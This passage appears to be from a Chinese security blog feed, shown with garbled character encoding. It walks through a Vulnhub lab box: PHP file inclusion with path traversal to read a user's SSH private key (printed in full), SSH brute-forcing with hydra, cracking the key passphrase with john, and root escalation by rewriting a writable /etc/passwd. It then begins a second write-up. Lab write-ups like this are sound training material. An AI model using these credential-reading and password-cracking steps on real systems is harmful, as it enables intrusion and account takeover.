<li>å¦‚æœå‰ä¸¤è€…éƒ½ä¸è¡Œï¼Œé‚£ä¹ˆå°±åˆ©ç”¨ä¼ªåè®®è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼›</li>
</ol>
<h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«">è¿œç¨‹æ–‡ä»¶åŒ…å«</h3>
<p>å…ˆéªŒè¯æ˜¯å¦å­˜åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œéšä¾¿åœ¨kaliä¸Šå†™ä¸€ä¸ªæ–‡ä»¶ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello world!</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åå¼€å¯httpæœåŠ¡ï¼ˆå…ˆç”¨æµè§ˆå™¨è®¿é—®ä¸€ä¸‹æ˜¯å¦æˆåŠŸå¼€å¯ï¼‰ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start apache2</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406222903.png" /></p>
<p>æœ€åï¼Œåœ¨urlåŒ…å«kaliä¸Šçš„è¯¥æ–‡ä»¶ï¼Œå¦‚æœæ˜¾ç¤ºçš„å†…å®¹ä¸ä¸Šå›¾ç›¸åŒåˆ™è¯´æ˜å­˜åœ¨è¿œç¨‹åŒ…å«ã€‚å¾ˆå¯æƒœï¼Œç»“æœæ˜¯ç©ºï¼Œä¹Ÿå°±æ˜¯ä¸å­˜åœ¨è¯¥æ¼æ´ã€‚</p>
<h3 id="ä¼ªåè®®å†™æ–‡ä»¶">ä¼ªåè®®å†™æ–‡ä»¶</h3>
<blockquote>
<p>php://filteré»˜è®¤æ˜¯readï¼Œä½†æ˜¯å¯ä»¥writeï¼åˆ©ç”¨è¿™ä¸ªå¯ä»¥å†™ä¸€å¥è¯ã€‚ä½†æ˜¯å¯èƒ½æ²¡æœ‰å†™å…¥çš„æƒé™ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=test.php&amp;txt=aGVsbG8gd29ybGQ=</span><br><span class="line"></span><br><span class="line">hello worldç»è¿‡base64ç¼–ç ï¼šaGVsbG8gd29ybGQ=</span><br></pre></td></tr></table></figure>
<p>è®¿é—®ä¹‹åå‘ç°é¡µé¢è¿˜æ˜¯ç©ºç™½ï¼Œå¹¶ä¸çŸ¥é“æ˜¯å¦æˆåŠŸå†™å…¥ï¼ˆé»˜è®¤å†™åœ¨å½“å‰ç›®å½•ï¼‰ã€‚ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶éªŒè¯ä¸€ä¸‹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406223423.png" /></p>
<p>å‘ç°å¹¶æ²¡æœ‰å†™å…¥æˆåŠŸï¼Œå› æ­¤è¯æ˜æ²¡æœ‰å†™æ–‡ä»¶çš„æƒé™ã€‚</p>
<h3 id="ä¼ªåè®®ä¿¡æ¯æ”¶é›†">ä¼ªåè®®ä¿¡æ¯æ”¶é›†</h3>
<p>å¯ä»¥å…ˆè¯»å–<code>evil.php</code>çš„å†…å®¹ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure></p>
<p>å°†å¾—åˆ°çš„ç»“æœbase64è§£ç åå¾—åˆ°ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>è¿™ä¹Ÿè¯´æ˜äº†è¯¥æ–‡ä»¶ç¡®å®å­˜åœ¨<strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong>ã€‚</p>
<h2 id="è¾¹ç•Œçªç ´get-shell">è¾¹ç•Œçªç ´ï¼ˆGET SHELLï¼‰</h2>
<h3 id="sshçˆ†ç ´">SSHçˆ†ç ´</h3>
<p>ä»ä¹‹å‰çš„ä¿¡æ¯æ”¶é›†å‘ç°æœ‰ä¸¤ä¸ªè´¦å·ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤å°è¯•å¯¹è¿™ä¸¤ä¸ªè´¦å·è¿›è¡Œå¯†ç çˆ†ç ´ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://10.0.2.9  </span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225551.png" /></p>
<p>å‘ç°å¹¶æ²¡æœ‰æˆåŠŸï¼Œå½“ç„¶ä¹Ÿå¯èƒ½æ˜¯æˆ‘çš„å­—å…¸å¤ªå°äº†ã€‚å› æ­¤å°è¯•å…¶ä»–åŠæ³•ã€‚</p>
<h3 id="sshç§é’¥æ³„éœ²sshå…¬é’¥ç™»å½•">SSHç§é’¥æ³„éœ²ï¼ˆSSHå…¬é’¥ç™»å½•ï¼‰</h3>
<p>æœ¬æ¥æ€è·¯å·²ç»æ–­äº†ï¼Œå°±å»æœç´¢äº†ä¸€ä¸‹ï¼Œå‘ç°SSHé™¤äº†å¯†ç ç™»é™†ä¹‹å¤–è¿˜å¯èƒ½å­˜åœ¨ç€å…¬é’¥ç™»å½•ï¼Œä¸è¿‡éœ€è¦çŸ¥é“ç§é’¥ï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨<strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong>æ¥è¯»å–ç§é’¥ã€‚</p>
<p><strong>ç¬¬ä¸€æ­¥ï¼Œå…ˆåˆ¤æ–­ä»¥ä¸‹é¶æœºæ˜¯å¦æ”¯æŒSSHå…¬é’¥ç™»å½•</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -v</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225910.png" /></p>
<p>æ³¨æ„ç®­å¤´æŒ‡å‘çš„é‚£å¥è¯ï¼Œè¯´æ˜<code>mowree</code>å­˜åœ¨å…¬é’¥ç™»å½•ã€‚ï¼ˆè™½ç„¶rootä¹Ÿå­˜åœ¨ï¼Œä½†æ˜¯ç§é’¥å’Œå…¬é’¥æ–‡ä»¶ä¸€èˆ¬ä¿å­˜åœ¨ç”¨æˆ·å®¶ç›®å½•ï¼Œè€Œæˆ‘ä»¬è‚¯å®šæ²¡æœ‰æƒé™è¯»å–rootç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸ç”¨get shellï¼‰</p>
<p><strong>ç¬¬äºŒæ­¥ï¼Œè¯»å–å…¬é’¥å’Œç§é’¥çš„ä¿¡æ¯</strong></p>
<blockquote>
<p>å¦‚æœæ”¯æŒå…¬é’¥ç™»å½•çš„è¯ï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·çš„å®¶ç›®å½•åº”è¯¥åŒ…å«ç›¸å…³çš„ä¿¡æ¯ï¼Œæ¯”å¦‚é»˜è®¤ä½ç½® å…¬é’¥ï¼š<code>/home/username/.ssh/authorized_keys</code>ï¼ˆå¯ä»¥çœ‹åˆ°åŠ å¯†ç®—æ³•ï¼‰ ç§é’¥ï¼š<code>/home/username/.ssh/id_rsa</code>ï¼ˆå¦‚æœåŠ å¯†ç®—æ³•ä¸ºrsaçš„è¯ï¼‰</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹é¡µé¢æºç çš„æ ¼å¼æ¯”è¾ƒå¥½çœ‹ï¼ˆæ³¨æ„æ ¼å¼ä¸è¦æ”¹å˜ï¼‰ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
<p><strong>ç¬¬ä¸‰æ­¥ï¼Œåˆ©ç”¨ç§é’¥ç™»å½•</strong></p>
<p>å°†ç§é’¥å†™å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -i id_rsa <span class="comment"># æ–‡ä»¶åå¯ä»¥ä»»æ„</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231421.png" /></p>
<hr />
<p><strong>æç¤º</strong>ï¼š</p>
<p>ä¸è®ºå°†ç§é’¥æ‰€åœ¨çš„æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œä¸€å®šè¦å°†æƒé™è®¾ç½®ä¸º600ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œæç¤ºæƒé™ä¸å¤Ÿã€‚ï¼ˆä¸€èˆ¬å…¬ã€ç§é’¥çš„æ–‡ä»¶é…ç½®éƒ½æ˜¯600ï¼‰å°±åƒä¸‹å›¾ä¸€æ ·ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231324.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
<hr />
<p>ä½¿ç”¨ç§é’¥ç™»å½•å‘ç°è¿˜éœ€è¦è¾“å…¥ä¸€ä¸ª<code>passphrase</code>ã€‚</p>
<blockquote>
<p>å…¬ç§é’¥å¯¹ç”Ÿæˆçš„æ—¶å€™ï¼Œæœ‰æ—¶å€™ä¼šç»™ç§é’¥åŠ ä¸€ä¸ªå¯†ç ï¼Œè¦æƒ³åˆ©ç”¨å…¬é’¥ç™»å½•æ–¹å¼çš„è¯ï¼Œå°±å¿…é¡»è¾“å…¥åŠ å¯†ç§é’¥çš„å¯†ç ã€‚ å¯ä»¥ä½¿ç”¨å¯†ç çˆ†ç ´ã€‚æœ‰hashcatï¼Œ johnç­‰å·¥å…·</p>
</blockquote>
<p>å…ˆå°† id_rsa è¿›è¡Œæ ¼å¼è½¬æ¢ä¸ºjohnèƒ½å¤Ÿè¯†åˆ«çš„ï¼ˆç›®å½•åœ¨<code>/usr/share/john</code>ï¼‰ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./ssh2john.py /home/hdfzzf/id_rsa &gt; /home/hdfzzf/<span class="built_in">hash</span></span><br></pre></td></tr></table></figure></p>
<p>ç„¶åè¿›è¡Œç ´è§£ï¼ˆæœ€å¥½æ‰¾ä¸€ä¸ªå¤§ä¸€ç‚¹çš„å­—å…¸ï¼Œå»ºè®®<code>/usr/share/wordlists/rockyou.txt.gz</code>ï¼‰ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt <span class="comment"># å°†å­—å…¸å’Œhashæ”¾åˆ°åŒä¸€ç›®å½•</span></span><br><span class="line"></span><br><span class="line">çˆ†ç ´ç»“æœï¼šunicorn</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232742.png" /></p>
<p>å†æ¬¡åˆ©ç”¨SSHå…¬é’¥ç™»å½• <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ssh mowree@10.0.2.9 -i id_rsa</span><br><span class="line">2. è¾“å…¥å¯†ç ï¼šunicorn</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232911.png" /></p>
<p>æˆåŠŸget shellï¼</p>
<h2 id="æƒé™æå‡">æƒé™æå‡</h2>
<p>Linuxæœ¬é¢˜ææƒå¯ä»¥ä½¿ç”¨ï¼šå†…æ ¸æ¼æ´ã€SUIDã€SUDOé…ç½®ã€crontabä»»åŠ¡ã€‚å…¶ä¸­æŸ¥æ‰¾SUID/SGIDæ–‡ä»¶å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null <span class="comment"># 4000ä»£è¡¨suidæƒé™ï¼Œ2000ä»£è¡¨SGIDï¼›åé¢çš„è¡¨ç¤ºä¸æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯</span></span><br></pre></td></tr></table></figure></p>
<p>è¦æŸ¥æ‰¾ç¬¬ä¸‰æ–¹ç¼–å†™çš„ç¨‹åºæ˜¯å¦å…·æœ‰SUID/SGIDã€‚ç»æŸ¥æ‰¾å‘ç°å¹¶æ²¡æœ‰å¯ç”¨çš„ã€‚</p>
<p>è¿™é‡Œä»‹ç»ä¸€ä¸ªæ–°çš„ææƒæ€è·¯ï¼š<strong>æŸ¥æ‰¾é¶æœºä¸Šå½“å‰ç”¨æˆ·æ‹¥æœ‰å†™æƒé™ä¸”æ‹¥æœ‰è€…ä¸ºrootçš„æ–‡ä»¶ï¼Œç„¶åæ”¹å†™æ–‡ä»¶å†…å®¹å®ç°ææƒï¼ˆæ¯”å¦‚å†™å…¥ncåå¼¹shellçš„å‘½ä»¤ï¼‰</strong>ã€‚</p>
<p>åˆ©ç”¨ä¸‹è¿°å‘½ä»¤å¯»æ‰¾æ‹¥æœ‰å†™æƒé™çš„æ–‡ä»¶ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc|grep -v run|grep -v sys</span><br><span class="line"></span><br><span class="line">æŸ¥æ‰¾æ‹¥æœ‰å†™æƒé™çš„æ–‡ä»¶ã€‚è¿‡æ»¤procç›®å½•ï¼Œè¯¥ç›®å½•çš„æ–‡ä»¶æ˜¯ç³»ç»Ÿè¿è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€ç”Ÿæˆçš„ã€‚ä¸€èˆ¬runï¼Œsysç›®å½•ä¹Ÿä¸ç”¨çœ‹</span><br><span class="line"></span><br><span class="line">2: è¡¨ç¤ºæ ‡å‡†é”™è¯¯</span><br><span class="line"><span class="string">&#x27;&gt;&#x27;</span>: é‡å®šå‘</span><br><span class="line">/dev/null: æ˜¯ç©ºè®¾å¤‡ï¼Œå®ƒæ¥å—æ‚¨æƒ³è¦çš„ä»»ä½•è¾“å…¥å¹¶å°†å…¶ä¸¢å¼ƒã€‚å®ƒå¯ä»¥ç”¨æ¥æŠ‘åˆ¶ä»»ä½•è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶æ³¨æ„åˆ°è¿™ä¹ˆä¸€ä¸ªæ–‡ä»¶ï¼š<code>/etc/passwd</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407085603.png" /></p>
<p>è¿™ä¸ªæ–‡ä»¶å­˜å‚¨çš„é¶æœºä¸Šæ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œä¸€èˆ¬ç”¨æˆ·åªæœ‰è¯»æƒé™ï¼Œè€Œæ²¡æœ‰å†™æƒé™ã€‚è€Œè¿™å°é¶æœºä¸Šå´æ‹¥æœ‰å†™æƒé™ï¼Œè¿™æ˜¯ä¸€ä¸ªæå¤§çš„æ¼æ´ï¼</p>
<blockquote>
<p>å°çŸ¥è¯†ï¼š<code>/etc/passwd</code>é‡Œé¢çš„ç¬¬äºŒä¸ªå­—æ®µæ˜¯å¯†ç å­—æ®µï¼Œä¸€èˆ¬éƒ½åªæœ‰ä¸€ä¸ªxï¼Œè¡¨ç¤ºå¯†ç å·²åŠ å¯†ä¿å­˜åœ¨<code>/etc/shadow</code>ï¼ˆè¿™æ–‡ä»¶æ™®é€šç”¨æˆ·è¿è¯»æƒé™éƒ½æ²¡æœ‰ï¼‰ã€‚ä½†æ˜¯ï¼Œä¼˜å…ˆçº§æ˜¯<code>/etc/passwd</code>ä¼˜å…ˆï¼Œä¹Ÿå°±æ˜¯å¦‚æœ<code>/etc/passwd</code>é‡Œé¢å¯†ç å­—æ®µä¿å­˜äº†å¯†ç ï¼Œé‚£ä¹ˆ<code>/etc/shadow</code>ä¸­çš„å¯†ç å°±ä¼šå¤±æ•ˆï¼</p>
</blockquote>
<p>æ¥ä¸‹æ¥çš„æ€è·¯å¾ˆæ˜ç¡®äº†ï¼Œä¿®æ”¹<code>/etc/passwd</code>ä¸­rootçš„å¯†ç å­—æ®µï¼Œç„¶åç›´æ¥ç”¨<code>su -</code>å‘½ä»¤åˆ‡æ¢ã€‚ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥æ·»åŠ ä¸€æ¡è®°å½•<code>echo "root2:åŠ å¯†å¯†ç :0:0:root:/root:/bin/bash"</code>ï¼Œå› ä¸ºç”¨æˆ·åä¸æ˜¯æœ€é‡è¦çš„ï¼Œé‡è¦çš„æ˜¯uidï¼Œuidä¸º0å³ä½¿ç”¨æˆ·åä¸æ˜¯rootï¼Œä¹Ÿæ‹¥æœ‰rootæƒé™ã€‚ï¼‰</p>
<p>ç”Ÿæˆå¯†ç çš„åŠ å¯†å¯†æ–‡ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 <span class="comment"># -1 æŸç§åŠ å¯†ç®—æ³•</span></span><br><span class="line"></span><br><span class="line">æ˜æ–‡ï¼šroot</span><br><span class="line">å¯†æ–‡ï¼š$1$yKHIKZSK<span class="variable">$R26qtrasBuYAfoQJvngpU0</span></span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆè¿™é‡Œæ“ä½œéœ€è¦æ³¨æ„ï¼šéœ€è¦åœ¨æ­£å¸¸æ¨¡å¼ä¸‹åˆ é™¤å’Œç²˜è´´å¯†ç ï¼Œæ’å…¥æ¨¡å¼ä¸‹ä¸Šä¸‹å·¦å³åˆ éƒ½ä¼šè¢«è§£æä¸ºå­—ç¬¦ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090904.png" /></p>
<p>ç„¶å <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - æˆ–è€… su root <span class="comment"># ç™»å½•root</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090950.png" /></p>
<p>æˆåŠŸç™»å½•ã€‚</p>
<p>ç¬¬ä¸€ä¸ªflagåœ¨<code>/home/mowree/user.txt</code>ï¼Œç¬¬äºŒä¸ªflagåœ¨<code>/root/root.txt</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.txt: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</span><br><span class="line">root.txt: 36QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br></pre></td></tr></table></figure>
<p>åˆ°æ­¤ï¼Œæœ¬å°é¶æœºçš„æ¸—é€ç»“æŸã€‚</p>
<h2 id="éªŒè¯æ“ä½œ">éªŒè¯æ“ä½œ</h2>
<p>å‘ç°å³ä½¿æ”¹äº†rootçš„å¯†ç ï¼Œä¹Ÿæ— æ³•ç›´æ¥ç”¨sshç›´æ¥ç™»å½•rootï¼ŒåŸå› æ˜¯æƒé™ä¸å¤Ÿã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091627.png" /></p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæ”¹äº†<code>mowree</code>çš„å¯†ç ï¼Œåˆ™å¯ä»¥ç›´æ¥ä½¿ç”¨sshçš„å¯†ç ç™»å½•ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091712.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>å¯¹è¯¥é¶æœºçš„ç»ƒä¹ ï¼Œå­¦åˆ°äº†è®¸å¤šä¸œè¥¿ã€‚</p>
<p>åœ¨webæ–¹é¢ï¼Œé™¤äº†ä¹‹å‰çš„è·¯å¾„çˆ†ç ´ä¹‹å¤–ï¼Œè¿˜äº†è§£åˆ°äº†<strong>å‚æ•°çˆ†ç ´</strong>ã€‚å·²ç»<strong>æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨</strong>ã€‚åœ¨æƒé™æå‡å’Œåå¼¹shellä¸Šï¼Œå­¦åˆ°äº†<strong>SSHçˆ†ç ´</strong>å’Œ<strong>SSHå…¬é’¥ç™»å½•</strong>ï¼Œè¿˜æœ‰è¿™å…¶ä¸­ä½¿ç”¨çš„ä¸€äº›å°å·¥å…·ã€‚</p>
<p>è¿˜æœ‰ä¸€äº›Linuxçš„å°çŸ¥è¯†ï¼Œæ¯”å¦‚å¯ä»¥å¤šè¿”å›å‡ æ¬¡ä¸Šä¸€çº§ç›®å½•ï¼Œä»¥åŠ<code>find</code>å‘½ä»¤çš„åŸºæœ¬ä½¿ç”¨ç­‰ã€‚</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>SSHå…¬é’¥ç™»å½•</tag>
        <tag>å‚æ•°çˆ†ç ´</tag>
        <tag>PHPä¼ªåè®®</tag>
      </tags>
  </entry>
  <entry>
    <title>7 Vulnhub HackerKid1.0.1 Writeup</title>
    <url>/2022/04/08/7%20Vulnhub%20HackerKid1.0.1%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä»‹äºç®€å•å’Œä¸­ç­‰ä¹‹é—´ï¼Œå…·æœ‰OSCPé£æ ¼ï¼Œä¸å»ºè®®çˆ†ç ´ï¼Œæ¯ä¸€æ­¥éƒ½ä¼šæœ‰é€‚å½“çš„æç¤ºã€‚æ¸—é€æ‰€ç”¨åˆ°çš„æ”»å‡»æ–¹å¼æ¯”è¾ƒæ–°ï¼ˆè¾ƒå‰å‡ ä¸ªé¶æœºæ¥è¯´ï¼‰ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">hacker_kid</a></p>
<p>éš¾åº¦ï¼šEasy/Medium (Intermediate)ã€‚OSCPé£æ ¼çš„ä¸­çº§éš¾åº¦é¶æœº</p>
<p>ç›®æ ‡ï¼šå–å¾—rootæƒé™ï¼ˆå…³æ³¨ä¿¡æ¯æ”¶é›†ï¼Œä¸éœ€è¦è›®åŠ›ç ´è§£ï¼Œæ¯ä¸€æ­¥éƒ½æœ‰é€‚å½“çš„æç¤ºï¼‰</p>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>Webä¿¡æ¯æ”¶é›†</li>
<li><strong>DNSåŸŸä¼ é€</strong></li>
<li>XXEæ³¨å…¥æ”»å‡»</li>
<li>SSTIæ¨¡æ¿æ³¨å…¥</li>
<li><strong>Capabilitiesææƒ</strong></li>
</ul>
<h1 id="dnsåŸŸä¼ é€">DNSåŸŸä¼ é€</h1>
<h2 id="dnsåŸŸç®€ä»‹">DNSåŸŸç®€ä»‹</h2>
<p>DNS (Domain Name System)çš„ä½œç”¨æ˜¯å°†åŸŸåè½¬ä¸ºå¯¹åº”çš„IPã€‚<strong>DNSåŸŸæ˜¯DNSæœåŠ¡å™¨æä¾›æœåŠ¡çš„åŸŸåç©ºé—´çš„ä¸€éƒ¨åˆ†</strong>ã€‚ä¾‹å¦‚ï¼Œ<code>cloudflare.com</code>åŠå…¶æ‰€æœ‰å­åŸŸï¼ˆ<code>*.cloudflare.com</code>ï¼‰å¯èƒ½æ˜¯ä¸€ä¸ªDNSåŸŸï¼Œå½“ç„¶<code>blog.example.com</code>ä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªå•ç‹¬çš„DNSåŸŸã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407230721.png" /></p>
<p><strong>åŒä¸€ä¸ªæœåŠ¡å™¨ä¸Šå¯ä»¥æœ‰å¤šä¸ªwebåº”ç”¨</strong>ï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š</p>
<ol type="1">
